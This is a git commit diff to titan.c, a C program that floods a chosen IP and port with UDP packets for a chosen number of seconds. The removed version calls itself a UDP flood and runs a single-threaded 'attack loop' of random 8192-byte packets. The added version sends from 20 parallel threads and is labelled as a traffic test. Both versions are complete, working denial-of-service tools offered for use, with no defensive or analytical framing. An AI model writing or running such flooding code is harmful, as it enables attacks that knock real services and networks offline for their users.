1740df33ff3f6b987eb43b578ef0193f177d42c0
Yogender <yogender.11907053@lpu.in>
2024-10-18 17:04:57 +0530

    Update titan.c

--- titan.c
+++ titan.c
@@ -1,70 +1,82 @@
-// udp_flood.c
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <arpa/inet.h>
-#include <sys/socket.h>
+#include <pthread.h>
 #include <time.h>
 
-#define PACKET_SIZE 8192  // Size of each UDP packet (can be adjusted)
+#define BUFFER_SIZE 9000
 
-// Generate random data to fill the UDP packet
-void generate_packet(char *packet, int size) {
-    for (int i = 0; i < size; ++i) {
-        packet[i] = rand() % 256;  // Random byte values from 0 to 255
+// Global variables
+char *ip;
+int port;
+int duration;
+
+// Function to send UDP traffic
+void *send_udp_traffic(void *arg) {
+    int sock;
+    struct sockaddr_in server_addr;
+    char buffer[BUFFER_SIZE];
+    int sent_bytes;
+
+    // Create a socket
+    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
+        perror("Socket creation failed");
+        pthread_exit(NULL);
     }
+
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(port);
+    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
+        perror("Invalid address/ Address not supported");
+        close(sock);
+        pthread_exit(NULL);
+    }
+
+    snprintf(buffer, sizeof(buffer), "UDP traffic test");
+
+    time_t start_time = time(NULL);
+    time_t end_time = start_time + duration;
+
+    while (time(NULL) < end_time) {
+        sent_bytes = sendto(sock, buffer, strlen(buffer), 0,
+                            (struct sockaddr *)&server_addr, sizeof(server_addr));
+        if (sent_bytes < 0) {
+            perror("Send failed");
+            close(sock);
+            pthread_exit(NULL);
+        }
+    }
+
+    close(sock);
+    pthread_exit(NULL);
 }
 
 int main(int argc, char *argv[]) {
     if (argc != 4) {
-        printf("Usage: %s <target_ip> <target_port> <duration_seconds>\n", argv[0]);
-        return 1;
+        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
+        exit(EXIT_FAILURE);
     }
 
-    const char *target_ip = argv[1];
-    int target_port = atoi(argv[2]);
-    int duration = atoi(argv[3]);
+    ip = argv[1];
+    port = atoi(argv[2]);
+    duration = atoi(argv[3]);
 
-    // Create a UDP socket
-    int sock = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sock < 0) {
-        perror("Socket creation failed");
-        return 1;
-    }
+    const int threads = 20;
+    pthread_t tid[threads];
 
-    // Target address setup
-    struct sockaddr_in target_addr;
-    target_addr.sin_family = AF_INET;
-    target_addr.sin_port = htons(target_port);
-    if (inet_pton(AF_INET, target_ip, &target_addr.sin_addr) <= 0) {
-        perror("Invalid target IP address");
-        return 1;
-    }
-
-    // Allocate memory for the UDP packet
-    char packet[PACKET_SIZE];
-
-    printf("Starting UDP flood on %s:%d for %d seconds...\n", target_ip, target_port, duration);
-
-    // Start the attack timer
-    time_t start_time = time(NULL);
-
-    // Main attack loop
-    while (time(NULL) - start_time < duration) {
-        generate_packet(packet, PACKET_SIZE);
-
-        // Send the packet to the target
-        if (sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
-            perror("Packet send failed");
-            break;
+    for (int i = 0; i < threads; i++) {
+        if (pthread_create(&tid[i], NULL, send_udp_traffic, NULL) != 0) {
+            perror("Thread creation failed");
+            exit(EXIT_FAILURE);
         }
     }
 
-    printf("Attack finished.\n");
+    for (int i = 0; i < threads; i++) {
+        pthread_join(tid[i], NULL);
+    }
 
-    // Close the socket
-    close(sock);
     return 0;
 }
